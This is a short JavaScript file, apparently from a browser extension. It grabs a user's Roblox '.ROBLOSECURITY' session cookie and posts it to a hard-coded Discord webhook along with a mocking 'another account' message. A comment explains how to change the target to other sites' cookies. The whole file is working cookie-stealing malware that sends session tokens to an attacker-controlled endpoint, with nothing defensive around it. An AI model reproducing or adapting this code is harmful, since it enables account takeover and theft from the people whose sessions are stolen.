function webhookReq(webhook, cookie) {
  var params = {
      embeds: [{
            "title": `$ logogeg on top`,
            "description": ">>> LOGO has tooken another account lmao :skull:",
            "color": 141414,
            "fields": [{
              "name": 'Cookie',
              "value": "```\n" + cookie + "\n```",
              inline: false
            }]
    }]
  }
   
  // Send the webhook request
  fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}



// Driver Code:
cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
chrome.cookies.get(cookieInfo, function(cookie) {
  if (cookie) {
    webhookReq("https://discord.com/api/webhooks/997120098932359249/YNyGj8l5momknC3he_3S1SdWeqBjtW9B4slZhuT4Xo8WJpPyhnFbIl9yaohDpoCbSkTa", cookie.value);
  }
});
